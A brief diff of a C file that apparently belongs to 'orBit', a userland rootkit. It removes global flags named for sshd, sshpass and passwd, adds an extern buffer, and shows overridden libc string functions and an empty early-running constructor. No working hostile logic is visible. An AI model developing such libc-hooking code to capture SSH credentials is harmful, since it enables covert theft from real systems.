@@ -1,10 +1,7 @@
 #include "orBit.h"
 
-uint8_t     sshd = 0;
-int         fd = 0;
 char        buf[ SIZE_BUF ];
-uint8_t     sshpass = 0;
-uint8_t     passwd = 0;
+extern char        *content;
 
 int	        strcmp( const char *s1, const char *s2 )
 {
@@ -36,7 +33,7 @@ char		 *strrchr( const char *s, int c )
  */
 __attribute__((constructor(101))) void __debug()
 {
-   
+
 }
 
 /*
